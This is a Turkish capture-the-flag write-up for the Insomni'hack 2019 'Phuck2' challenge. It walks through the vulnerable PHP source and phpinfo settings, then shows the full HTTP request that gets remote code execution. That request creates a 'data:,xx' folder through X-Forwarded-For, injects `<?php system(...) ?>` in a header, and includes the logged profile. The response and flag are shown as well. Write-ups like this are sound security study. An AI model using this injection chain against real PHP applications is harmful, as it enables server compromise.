# Phuck2 – Insomni’hack 2019

Another year, another PH(P)uck. Have fun with that !

http://phuck.teaser.insomnihack.ch/?hl=1

http://phuck.teaser.insomnihack.ch/phpinfo.php


```php
<?php
    stream_wrapper_unregister('php');
    if(isset($_GET['hl'])) highlight_file(__FILE__);

    $mkdir = function($dir) {
        system('mkdir -- '.escapeshellarg($dir));
    };

    $randFolder = bin2hex(random_bytes(16));
    $mkdir('users/'.$randFolder);
    chdir('users/'.$randFolder);

    $userFolder = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
    $userFolder = basename(str_replace(['.','-'],['',''],$userFolder));

    $mkdir($userFolder);
    chdir($userFolder);
    file_put_contents('profile',print_r($_SERVER,true));
    chdir('..');

    $_GET['page']=str_replace('.','',$_GET['page']);
    if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {
        include($_GET['page']);
    }

    chdir(__DIR__);
    system('rm -rf users/'.$randFolder);
```

# Analiz 

## Kodun analizi

```php
stream_wrapper_unregister('php');
```
**php://** wrapperını kayıtdışı ediyoruz.

---
```php
$mkdir = function($dir) {
    system('mkdir -- '.escapeshellarg($dir));
};
```
**escapeshellarg** ifadesini geçemeyeceğimiz için bura ile uğraşmamıza gerek yok

---
```php
$randFolder = bin2hex(random_bytes(16));
$mkdir('users/'.$randFolder);
chdir('users/'.$randFolder);
```
Kullanıcıya özel random bir klasör oluşturup dizini değiştiriyor.

---
```php
$userFolder = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
$userFolder = basename(str_replace(['.','-'],['',''],$userFolder));
```
**X-Forwarded-For** headeri set edilmiş ise headerin değerini, edilmemiş ise kullanıncın(bizim) IP adresimizi **$userFolder** değişkenine atıyor.

**$userFolder** değişkenindeki değerin varsa **noktaları**, **tire** ve **boşluk** karakterlerini -siliyor- '' ile değiştiriyor. (“127.0.0 .1” -> “127001” gibi)

---
```php
$mkdir($userFolder);
chdir($userFolder);
file_put_contents('profile',print_r($_SERVER,true));
chdir('..');
```
**$userFolder** değeri ile klasör açar ve o klasörün içine **profile** adlı dosyaya [**$_SERVER** arrayinin](http://php.net/manual/tr/reserved.variables.server.php) içeriğini yazar.

---
```php
$_GET['page']=str_replace('.','',$_GET['page']);

if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {
    include($_GET['page']);
}

chdir(__DIR__);
system('rm -rf users/'.$randFolder);
```
**GET** ile yolladığımız **page** değerindeki noktaları siliyor ve **file_get_contents($page)** ile açtığımız dosyanın içinde stripos ile  dosyanın içerisinde **<?** veya **php** kelimelerinin geçip geçmediğini kontrol ediyor. 

Daha sonra dosyayı siliyor

----
## Phpinfo

|     Directive     | Local Value | Master Value |
|:-----------------:|:-----------:|:------------:|
|  allow_url_fopen  |      On     |      On      |
| allow_url_include |     Off     |      Off     |

Olduğunu görüyoruz bunun anlamı **include** içerisinde **url** ve bazı **wrapperler** çalışmayacak.

## Çözüm
---

**data:,xx/profile** diye veri yolladığımız zaman **allow_url_fopen** ve **allow_url_include**'dan dolayı;
```
# --> döndürdüğü(return) değerini ifade edecek
file_get_contents('data:,xx/profile'); --> string 'xx/profile'
include('data:,xx/profile');           --> 'data:,xx/profile' adına sahip dosyasının içeriği
```
**data** wrapperi **file_get_contents**'te çalışırken **include**'ta çalışmadı.

yani;

```
GET /?page=data:,xx/profile HTTP/1.1
X-Forwarded-For: data:,xx
Get-Flag: <?php system('/get_flag'); ?>
Host: phuck.teaser.insomnihack.ch


HTTP/1.1 200 OK
Date: Sun, 20 Jan 2019 20:16:13 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: User-Agent,Accept-Encoding
Content-Length: 1101
Content-Type: text/html; charset=UTF-8

Array
(
    [HTTP_X_FORWARDED_FOR] => data:,xx
    [HTTP_GET_FLAG] => INS{PhP_UrL_Phuck3rY_h3h3!}
    [HTTP_HOST] => phuck.teaser.insomnihack.ch
    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    [SERVER_SIGNATURE] => <address>Apache/2.4.29 (Ubuntu) Server at phuck.teaser.insomnihack.ch Port 80</address>

    [SERVER_SOFTWARE] => Apache/2.4.29 (Ubuntu)
    [SERVER_NAME] => phuck.teaser.insomnihack.ch
    [SERVER_ADDR] => 172.17.0.2
    [SERVER_PORT] => 80
    [REMOTE_ADDR] => **CENSORED**
    [DOCUMENT_ROOT] => /var/www/html/
    [REQUEST_SCHEME] => http
    [CONTEXT_PREFIX] => 
    [CONTEXT_DOCUMENT_ROOT] => /var/www/html/
    [SERVER_ADMIN] => [no address given]
    [SCRIPT_FILENAME] => /var/www/html/index.php
    [REMOTE_PORT] => 42696
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.1
    [REQUEST_METHOD] => GET
    [QUERY_STRING] => page=data:,xx/profile
    [REQUEST_URI] => /?page=data:,xx/profile
    [SCRIPT_NAME] => /index.php
    [PHP_SELF] => /index.php
    [REQUEST_TIME_FLOAT] => 1548015373.641
    [REQUEST_TIME] => 1548015373
)

```

Ve flag **INS{PhP_UrL_Phuck3rY_h3h3!}**
---
---
### NOT: Soruyu CTF sırasınca çözmüş olmayıp, CTF sornası IRC'den verilen bilgiler (**Blaklis** tarafından) yardımı ile yazılmıştır 